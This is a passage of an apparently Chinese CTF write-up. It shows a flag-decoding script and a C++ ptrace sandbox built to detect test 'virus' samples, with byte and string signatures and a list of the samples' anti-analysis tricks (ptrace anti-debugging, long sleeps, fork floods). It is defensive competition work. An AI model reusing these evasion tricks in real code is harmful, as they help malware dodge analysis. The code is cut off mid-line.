+= p32(x)<br>print(data2_bytes)<br>data2_bytes = <span class="hljs-built_in">bytearray</span>(data2_bytes)<br><br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data2_bytes)):<br>    bb = data2_bytes[idx]<br>    tmp = (bb - tab2[idx] &amp; <span class="hljs-number">0xff</span>)<br>    tmp ^=( tab3[idx] &amp; <span class="hljs-number">0xff</span>)<br>    data2_bytes[idx] = tmp<br><br>print(data2_bytes)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    data2[i] = u32(data2_bytes[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>])<br><br>flag = []<br>state[<span class="hljs-number">0</span>] = <span class="hljs-number">123456789</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">846786818</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1443538759</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">4</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">2</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1047515510</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">3</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">359499514</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">1724461856</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">12</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">4</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">241024035</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">16</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">5</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">222267724</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">20</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">4096</span><br>state[<span class="hljs-number">1</span>] = data2[<span class="hljs-number">6</span>]<br>state[<span class="hljs-number">0</span>] ^= state[<span class="hljs-number">1</span>]<br>state[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br>state[<span class="hljs-number">2</span>] += <span class="hljs-number">844096018</span><br>state[<span class="hljs-number">2</span>] ^= state[<span class="hljs-number">0</span>]<br>state[<span class="hljs-number">1</span>] = <span class="hljs-number">24</span><br>state[<span class="hljs-number">1</span>] += <span class="hljs-number">6144</span><br>flag.append(state[<span class="hljs-number">2</span>])<br><br>flag1 = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:<br>    flag1 += binascii.a2b_hex(<span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:])[::-<span class="hljs-number">1</span>]<br>print(flag1)<br></code></pre></td></tr></table></figure><h2 id="POLYMORPH"><a href="#POLYMORPH" class="headerlink" title="POLYMORPH"></a>POLYMORPH</h2><p>题目数据下载:</p><p><a href="https://www.jianguoyun.com/p/Dd96zLgQsOuICRinloEE">https://www.jianguoyun.com/p/Dd96zLgQsOuICRinloEE</a> ( 访问密码：ygw3TH )</p><p>要求编写一个病毒自动检测程序，并提交检测程序的 bin 文件，要求检测程序平均 5 秒内检测一个样本是否为病毒。</p><p>由于是提交 bin 文件，用 C 来开发比较方便。</p><p>病毒样本会在标准输出输出 “STANDARD-ANTIVIRUS-TEST-FILE” 字符串。</p><p>简单分析了一下病毒集中的样本，发现有一些静态特征可以快速判断病毒（非病毒样不太刁钻，没有这些静态特征）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">STANDARD-ANTIVIRUS-<span class="hljs-keyword">TEST</span>-FILE!$H+H*<br>crypt_defenses<br>crypt_badstuff<br>&#123; <span class="hljs-number">0x55</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x83</span>,<br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x21</span>,<br><span class="hljs-number">0x51</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC9</span>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>经过静态特征的筛选，仍然有一些病毒无法检测出，它们有些骚操作</p><p>病毒样本的骚操作：</p><ul><li>动态解密目标字符串 “STANDARD-ANTIVIRUS-TEST-FILE”</li><li>通过 syscall 调用 ptraceme 反调试</li><li>sleep 很长的时间才触发目标字符串输出（大于5s，题目要求5s内）</li><li>fork 很多子进程</li><li>等待用户输入</li><li>……</li></ul><p>我的解决思路是写一个沙箱，基于 ptrace 实现，并且要绕过病毒的骚操作。</p><p>主要绕过方法是通过 ptrace hook 系统调用，在一些关键函数做手脚，例如 ptrace、nanosleep、read、write、fork 等。</p><p>完整检测沙箱 C 代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* <span class="hljs-title">callname</span><span class="hljs-params">(<span class="hljs-keyword">long</span> call)</span></span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __WORDSIZE == 64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REG(reg) reg.orig_rax</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REG(reg) reg.orig_eax</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> long_size = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span>);<br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">pthread_t</span>&gt; threads;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>  fuck1[] = &#123; <span class="hljs-number">0x55</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br><span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x83</span>,<br><span class="hljs-number">0xC0</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x21</span>,<br><span class="hljs-number">0x51</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xC9</span>&#125;;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * tags[] = &#123;<br>        <span class="hljs-string">&quot;STANDARD-ANTIVIRUS-TEST-FILE!$H+H*&quot;</span>,<br>        <span class="hljs-string">&quot;crypt_defenses&quot;</span>,<span class="hljs-string">&quot;crypt_badstuff&quot;</span><br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">detect_string</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * file)</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> * fileBuffer = <span class="hljs-literal">nullptr</span>;<br>    FILE * fp = fopen(file, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!fp) &#123;<br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;detect_string: faield to open: %s\n&quot;</span>, file);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">size_t</span> fsize = <span class="hljs-number">0</span>;<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_END);<br>    fsize = ftell(fp);<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);<br>    fileBuffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span> [fsize];<br><br>    fread(fileBuffer, fsize, <span class="hljs-number">1</span>, fp);<br><br><br>    <span class="hljs-keyword">bool</span>  ret = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-keyword">sizeof</span>(tags) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *); i++) &#123;<br>        ret |= (memmem(fileBuffer, fsize, tags[i], <span class="hljs-built_in">strlen</span>(tags[i])) != <span class="hljs-literal">nullptr</span>);<br><br>    &#125;<br>    ret |= memmem(fileBuffer, fsize, fuck1, <span class="hljs-keyword">sizeof</span>(fuck1)) != <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-keyword">delete</span> fileBuffer;<br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getdata</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> child, <span class="hljs-keyword">long</span> addr,</span></span><br><span class="hljs-function"><span class="hljs-params">             <span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;   <span class="hljs-keyword">char</span> *laddr;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">u</span> &#123;</span><br>            <span class="hljs-keyword">long</span> val;<br>            <span class="hljs-keyword">char</span> chars[long_size];<br>    &#125;data;<br>    i = <span class="hljs-number">0</span>;<br>    j = len / long_size;<br>    laddr = str;<br>    <span class="hljs-keyword">while</span>(i &lt; j) &#123;<br>        data.val = ptrace(PTRACE_PEEKDATA, child,<br>                          addr + i * <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">memcpy</span>(laddr, data.chars, long_size);<br>        ++i;<br>        laddr += long_size;<br>    &#125;<br>    j = len % long_size;<br>    <span class="hljs-keyword">if</span>(j != <span class="hljs-number">0</span>) &#123;<br>        data.val = ptrace(PTRACE_PEEKDATA, child,<br>                          addr + i * <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">memcpy</span>(laddr, data.chars, j);<br>    &#125;<br>    str[len] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> * <span class="hljs-title">process_event</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * pid)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> status;<br>    <span class="hljs-keyword">pid_t</span> child = (<span class="hljs-keyword">long</span>)pid;<br>    <span class="hljs-keyword">int</span> fork_cnt = <span class="hljs-number">0</span>;<br>    waitpid(child, &amp;status, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span>( ! WIFEXITED(status)) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> <span class="hljs-title">regs</span>;</span> <br>        <span class="hljs-keyword">int64_t</span> sys_num = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">bool</span> blocked = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">int</span> type;<br><br>        ptrace(PTRACE_SYSCALL, child, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        waitpid(child, &amp;status, <span class="hljs-number">0</span>);<br>        ptrace(PTRACE_GETREGS, child, <span class="hljs-literal">NULL</span>, &amp;regs);<br>        <br>        sys_num = REG(regs);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">0x23</span> == sys_num) &#123;<br>            regs.orig_rax = <span class="hljs-number">0x14</span>; <span class="hljs-comment">// set to invalid syscall</span><br>            ptrace(PTRACE_SETREGS, child, <span class="hljs-number">0</span>, &amp;regs);<br><br>           <span class="hljs-comment">// printf(&quot;blocked: %llx\n&quot;, regs.rip);</span><br>            blocked = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (sys_num == <span class="hljs-number">0x1</span>) &#123;<br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> * tag = <span class="hljs-string">&quot;EICAEICAR-STR-ST&quot;</span>;<br>            <span class="hljs-keyword">size_t</span> size = regs.rdx;<br>            <span class="hljs-keyword">char</span> * buffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[size];<br>            getdata(child, regs.rsi, buffer, size);<br>            <span class="hljs-keyword">if</span> (memmem(buffer, size, tag, <span class="hljs-built_in">strlen</span>(tag)) != <span class="hljs-literal">nullptr</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;evil\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>            &#125;<br>            <span class="hljs-keyword">delete</span> buffer;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(sys_num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (regs.rdi == <span class="hljs-number">0</span>)<br>            &#123;<br>                regs.orig_rax = <span class="hljs-number">0x14</span>; <span class="hljs-comment">// set to invalid syscall</span><br>                ptrace(PTRACE_SETREGS, child, <span class="hljs-number">0</span>, &amp;regs);<br>                blocked = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (sys_num == <span class="hljs-number">0x39</span>) &#123; <span class="hljs-comment">// fork</span><br>            regs.orig_rax = <span class="hljs-number">0x14</span>; <span class="hljs-comment">// set to invalid syscall</span><br>            ptrace(PTRACE_SETREGS, child, <span class="hljs-number">0</span>, &amp;regs);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bypass fork\n&quot;</span>);<br>            fork_cnt += <span class="hljs-number">1</span>;<br>            blocked = <span class="hljs-literal">true</span>;<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span>(sys_num == <span class="hljs-number">0x65</span>) &#123;<br>            regs.rax = <span class="hljs-number">0x14</span>;<br>            blocked = <span class="hljs-literal">true</span>;<br>            ptrace(PTRACE_SETREGS, child, <span class="hljs-number">0</span>, &amp;regs);<br>        &#125;<br><br><br>        ptrace(PTRACE_SYSCALL, child, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        waitpid(child, &amp;status, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">if</span> (blocked) &#123;<br>            <span class="hljs-comment">/* errno = EPERM */</span><br>            regs.rax = <span class="hljs-number">0</span>;<br>            ptrace(PTRACE_SETREGS, child, <span class="hljs-number">0</span>, &amp;regs);<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;exit: %d\n&quot;</span>, child);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sig_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum)</span></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;time out...\n&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;   <br>    <span class="hljs-keyword">pid_t</span> child;<br>    signal(SIGALRM,sig_handler); <span class="hljs-comment">// Register signal handler</span><br>    alarm(<span class="hljs-number">10</span>);<br><br>    <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span>(detect_string(argv[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;virus: %s\n&quot;</span>, argv[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">char</span>* chargs[argc];<br>        <span class="hljs-keyword">int</span> i = <span 